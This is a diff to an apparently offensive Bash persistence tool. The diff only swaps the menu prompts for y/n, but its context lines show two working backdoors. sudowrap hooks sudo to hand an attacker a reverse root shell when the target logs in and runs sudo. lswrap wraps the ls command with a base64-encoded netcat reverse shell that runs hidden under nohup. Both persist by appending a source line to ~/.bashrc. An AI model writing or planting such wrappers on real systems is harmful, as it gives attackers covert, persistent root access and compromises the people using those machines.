@@ -89,9 +89,9 @@ sudowrap(){
 		Wait for your target to log in and run sudo and you will receive a reverse root shell.
 		EOF
 
-	read -p "enter (continue/exit) or press enter to return to menu: " ce
+	read -p "Would you like to proceed? (y/n): " ce
 	case $ce in
-		[CONTINUEcontinue]* )
+		[y]* )
 			shell=${payloads[0]}
 			echo -e "Enter listener server address and port\n"
 			read -r -p "Address: " address
@@ -102,7 +102,7 @@ sudowrap(){
 			echo "source ~/.sudo" >> ~/.bashrc
 			echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
 			enter;;
-		[Exitexit]* ) return;;
+		[n]* ) return;;
 	esac
 }
 
@@ -116,16 +116,16 @@ lswrap(){
 		This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal
 		EOF
 
-	read -p "enter (continue/exit) or press enter to return to menu: " ce
+	read -p "Would you like to proceed? (y/n): " ce
 	case $ce in
-		[CONTINUEcontinue]* )
+		[y]* )
 			shell=${payloads[0]}
 			encshell
 			echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
 			echo "source ~/.ls" >> ~/.bashrc
 			echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
 			enter;;
-		[Exitexit]* ) return;;
+		[n]* ) return;;
 	esac
 }
 
